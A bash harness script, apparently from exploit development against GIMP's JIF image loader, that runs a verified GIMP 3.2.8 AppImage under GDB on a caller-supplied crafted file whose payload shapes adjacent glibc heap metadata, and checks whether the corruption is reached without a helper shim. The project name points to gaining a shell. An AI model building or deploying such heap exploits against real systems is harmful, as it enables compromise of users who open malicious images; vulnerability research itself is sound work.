#!/usr/bin/env bash
# W340: no-shim live differential on the minimal geometry. The caller supplies
# a selectively crafted JIF whose 40-byte payload preserves the adjacent
# glibc chunk size at indexes+24 while choosing the first user word at +32.
# Nothing in the GDB script or plug-in is changed; this runner reuses the
# W337 pinned inflate breakpoint and returns the same PRE/POST heap dump.
set -euo pipefail

HERE="$(cd "$(dirname "$0")" && pwd)"
BASE="$(cd "$HERE/.." && pwd)"
WORK="${GIMPJIF_APPIMAGE_WORK:-/tmp/gimpjif-appimage-w316}"
IMG="$WORK/GIMP-3.2.8-x86_64.AppImage"
ROOT="$WORK/squashfs-root"
APPRUN="$ROOT/AppRun.min340"
EVID="$HERE/evidence"
JIF="${GIMPJIF_W340_JIF:?set GIMPJIF_W340_JIF to a W340 JIF path}"
OUT="${GIMPJIF_W340_OUT:?set GIMPJIF_W340_OUT to a private log path}"
LOG="${GIMPJIF_W340_LOG:-/tmp/w340-$$.log}"
GDB="${GIMPJIF_W340_GDB:-$HERE/gdb-min337.cmd}"
mkdir -p "$(dirname "$OUT")" "$EVID"
if [ ! -f "$IMG" ] || [ ! -f "$WORK/SHA256SUMS" ] || [ ! -x "$ROOT/AppRun" ]; then
  echo "provision the SHA256-verified GIMP 3.2.8 AppImage first" >&2
  exit 1
fi
(cd "$WORK" && grep 'GIMP-3.2.8-x86_64.AppImage' SHA256SUMS | sha256sum -c -)
[ -f "$JIF" ] || { echo "missing $JIF" >&2; exit 1; }
sha256sum "$JIF" "$GDB"
# Strip every gimpjif2shell preload line; the default AppRun preloads
# patch-shim.so, which would make this a shim-assisted run, not live evidence.
: > "$APPRUN"
while IFS= read -r line || [ -n "$line" ]; do
  case "$line" in
    *gimpjif2shell/live/*shim.so*) continue ;;
  esac
  printf '%s\n' "$line" >> "$APPRUN"
done < "$ROOT/AppRun"
chmod +x "$APPRUN"
! grep -q 'gimpjif2shell/live/.*shim.so' "$APPRUN"

home="$(mktemp -d /tmp/gimpjif-min340-XXXXXX)"
(cd "$ROOT" && exec setsid timeout -k 5 150 env HOME="$home" \
    W337_LOG="$LOG" \
    GIMP_PLUGIN_DEBUG_WRAP=file-gif-load,run \
    GIMP_PLUGIN_DEBUG_WRAPPER="gdb -q -batch -x $GDB --args" \
    ./AppRun.min340 -i --batch-interpreter plug-in-script-fu-eval \
    -b "(let* ((img (car (gimp-file-load RUN-NONINTERACTIVE \"$JIF\" \"$(basename "$JIF")\")))) (gimp-message (number->string (car (gimp-image-get-width img)))))" \
    -b '(gimp-quit 0)') > "$OUT" 2>&1 &
runpid=$!
wait "$runpid" || true
kill -9 -- "-$runpid" 2>/dev/null || true

grep -q 'PRE avail=0x80000002' "$OUT" && echo "PASS: pinned inflate reached" || echo "FAIL: no pinned inflate"
grep -q 'SIGNAL' "$OUT" && echo "PASS: fault captured in GDB" || echo "INFO: no in-GDB fault stop"
cat "$LOG" 2>/dev/null || true
echo "--- tail ---"
grep -E 'W337 |W340 |Plug-in crashed|Fatal signal' "$OUT" | tail -40
